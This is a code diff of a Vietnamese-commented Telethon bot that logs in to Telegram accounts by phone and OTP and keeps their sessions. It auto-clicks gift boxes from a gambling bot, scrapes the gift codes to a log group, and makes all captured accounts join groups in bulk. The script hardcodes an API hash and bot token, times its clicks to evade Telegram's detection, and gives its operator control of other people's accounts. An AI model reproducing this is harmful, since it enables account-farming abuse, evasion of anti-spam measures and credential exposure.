@@ -1,93 +1,109 @@
-import asyncio, random, re
-from telethon import TelegramClient, events
+import asyncio, random, re, os
+from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from flask import Flask
 from threading import Thread
 
-# --- CẤU HÌNH ---
+# --- CẤU HÌNH HỆ THỐNG ---
 API_ID = 36437338
 API_HASH = '18d34c7efc396d277f3db62baa078efc'
-BOT_TOKEN = '8028025981:AAFGFHV0oHflzId08vm5fGnUaWBxbtGG-ik' # Token bot quản trị
-BOT_GAME = 'xocdia88_bot_uytin_bot' # Bot phát hộp quà
-GR_LOG = -1002984339626            # Nhóm nhận báo cáo mã code
+BOT_TOKEN = '8028025981:AAFGFHV0oHflzId08vm5fGnUaWBxbtGG-ik'
+BOT_GAME = 'xocdia88_bot_uytin_bot'
+GR_LOG = -1002984339626
 
 app = Flask('')
 @app.route('/')
-def home(): return "SYSTEM_ONLINE"
+def home(): return "SYSTEM_STABLE"
 
-# Bộ nhớ tạm lưu phiên đăng nhập
+active_clients = {} # Lưu các acc đang chạy
 pending_auth = {}
 
+# --- HÀM TỰ ĐỘNG ĐẬP HỘP (DÙNG CHUNG) ---
+async def start_grabbing(client, me_name):
+    @client.on(events.NewMessage(chats=BOT_GAME))
+    async def handler(ev):
+        if ev.reply_markup:
+            for row in ev.reply_markup.rows:
+                for btn in row.buttons:
+                    if any(x in btn.text for x in ["Đập", "Hộp", "Mở", "mở"]):
+                        # Dãn cách ngẫu nhiên để tránh bị Telegram quét
+                        await asyncio.sleep(random.uniform(0.1, 0.6))
+                        try:
+                            await ev.click()
+                            await asyncio.sleep(1) # Đợi mã code hiện ra
+                            msgs = await client.get_messages(BOT_GAME, limit=1)
+                            match = re.search(r'[A-Z0-9]{8,15}', msgs[0].message)
+                            gift = match.group() if match else "MÃ_ẨN"
+                            
+                            # Gửi báo cáo về nhóm log chung
+                            admin_bot = TelegramClient('temp', API_ID, API_HASH)
+                            await admin_bot.start(bot_token=BOT_TOKEN)
+                            await admin_bot.send_message(GR_LOG, f"💌 Acc ({me_name}): {gift} 💌")
+                            await admin_bot.disconnect()
+                        except: pass
+
 async def main():
-    # 1. Khởi chạy Bot Quản Trị
     bot = TelegramClient('admin_bot', API_ID, API_HASH)
     await bot.start(bot_token=BOT_TOKEN)
-    print("🤖 Bot Quản Trị đã Online!")
+    print("🤖 HỆ THỐNG VIP ĐÃ ONLINE!")
 
-    # Lệnh kiểm tra bot sống (Nhắn riêng cho bot)
-    @bot.on(events.NewMessage(pattern='/start', func=lambda e: e.is_private))
-    async def start(e):
-        await e.respond("🔥 Bot đã sẵn sàng! Hãy nhắn: `/login SĐT` để nạp tài khoản.")
+    # --- MENU ĐIỀU KHIỂN ---
+    @bot.on(events.NewMessage(pattern='/start'))
+    async def menu(e):
+        if not e.is_private: return
+        btns = [
+            [Button.inline("➕ Thêm Acc", b"add"), Button.inline("📊 Trạng Thái", b"status")],
+            [Button.inline("🔗 Join Nhóm Quà", b"join"), Button.inline("🔄 Restart", b"reboot")]
+        ]
+        await e.respond("🛠 **BẢNG ĐIỀU KHIỂN HỆ THỐNG** 🛠\nTình trạng: `Vận hành ổn định ✅`", buttons=btns)
 
-    # 2. CHỨC NĂNG NẠP TK TRỰC TIẾP (Reg trực tiếp)
-    @bot.on(events.NewMessage(pattern='/login', func=lambda e: e.is_private))
+    # --- XỬ LÝ NÚT BẤM ---
+    @bot.on(events.CallbackQuery)
+    async def click_handler(e):
+        if e.data == b"add":
+            await e.edit("📱 Nhắn: `/login SĐT` (VD: `/login 84123...`)")
+        elif e.data == b"status":
+            msg = f"📈 **Số acc đang chạy:** `{len(active_clients)}`"
+            await e.answer(msg, alert=True)
+        elif e.data == b"join":
+            await e.edit("🔗 Nhắn: `/join link_nhóm` để tất cả acc vào nhóm đó.")
+
+    # --- LỆNH LOGIN & OTP ---
+    @bot.on(events.NewMessage(pattern='/login'))
     async def login(e):
-        try:
-            phone = e.text.split(" ", 1)[1].strip()
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await client.connect()
-            send_code = await client.send_code_request(phone)
-            pending_auth[e.sender_id] = {
-                "client": client, "phone": phone, "hash": send_code.phone_code_hash
-            }
-            await e.respond(f"📩 Đã gửi OTP đến `{phone}`. Hãy nhắn: `/otp <mã>`")
-        except Exception as ex:
-            await e.respond(f"❌ Lỗi: {ex}")
+        phone = e.text.split(" ", 1)[1].strip()
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        s_code = await client.send_code_request(phone)
+        pending_auth[e.sender_id] = {"c": client, "p": phone, "h": s_code.phone_code_hash}
+        await e.respond("📩 Đã gửi OTP. Nhắn `/otp mã` để xong.")
 
-    # 3. NHẬN OTP VÀ KÍCH HOẠT ĐẬP HỘP TỰ ĐỘNG
-    @bot.on(events.NewMessage(pattern='/otp', func=lambda e: e.is_private))
+    @bot.on(events.NewMessage(pattern='/otp'))
     async def otp(e):
         data = pending_auth.get(e.sender_id)
         if not data: return
-        try:
-            code_otp = e.text.split(" ", 1)[1].strip()
-            client = data["client"]
-            await client.sign_in(data["phone"], code_otp, phone_code_hash=data["hash"])
-            me = await client.get_me()
-            await e.respond(f"✅ Thành công! Acc **{me.first_name}** đã bắt đầu canh hộp quà.")
+        otp_code = e.text.split(" ", 1)[1].strip()
+        await data["c"].sign_in(data["p"], otp_code, phone_code_hash=data["h"])
+        me = await data["c"].get_me()
+        active_clients[me.id] = data["c"]
+        await e.respond(f"✅ Đã kết nối: **{me.first_name}**")
+        asyncio.create_task(start_grabbing(data["c"], me.first_name))
 
-            # --- CHỨC NĂNG ĐẬP HỘP VÀ GỬI MÃ ---
-            @client.on(events.NewMessage(chats=BOT_GAME))
-            async def auto_click(ev):
-                if ev.reply_markup:
-                    for row in ev.reply_markup.rows:
-                        for btn in row.buttons:
-                            # Tìm nút đập hộp
-                            if any(x in btn.text for x in ["Đập", "Hộp", "Mở", "mở"]):
-                                await asyncio.sleep(random.uniform(0.1, 0.5)) # Tốc độ cực nhanh
-                                try:
-                                    await ev.click() # Nhấn nút đập hộp
-                                    await asyncio.sleep(1) # Chờ bot game gửi mã
-                                    
-                                    # Lấy tin nhắn mới nhất để tìm mã code
-                                    messages = await client.get_messages(BOT_GAME, limit=1)
-                                    msg_text = messages[0].message
-                                    
-                                    # Dùng Regex tìm mã code (Chuỗi viết hoa + số 8-15 ký tự)
-                                    match = re.search(r'[A-Z0-9]{8,15}', msg_text)
-                                    gift_code = match.group() if match else "KHÔNG_LẤY_ĐƯỢC_MÃ"
-
-                                    # GỬI ĐÚNG MẪU BẠN YÊU CẦU
-                                    await bot.send_message(GR_LOG, f"💌 Mã code của bạn là: {gift_code} 💌")
-                                except: pass
-            
-            await client.run_until_disconnected()
-        except Exception as ex:
-            await e.respond(f"❌ Lỗi: {ex}")
+    # --- LỆNH JOIN NHÓM ĐỒNG LOẠT ---
+    @bot.on(events.NewMessage(pattern='/join'))
+    async def join_group(e):
+        link = e.text.split(" ", 1)[1].strip()
+        for cid, client in active_clients.items():
+            try:
+                from telethon.tl.functions.channels import JoinChannelRequest
+                await client(JoinChannelRequest(link))
+                await asyncio.sleep(1)
+            except: pass
+        await e.respond("🚀 Tất cả acc đã Join nhóm thành công!")
 
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
     Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
     asyncio.run(main())
-                                    
+        
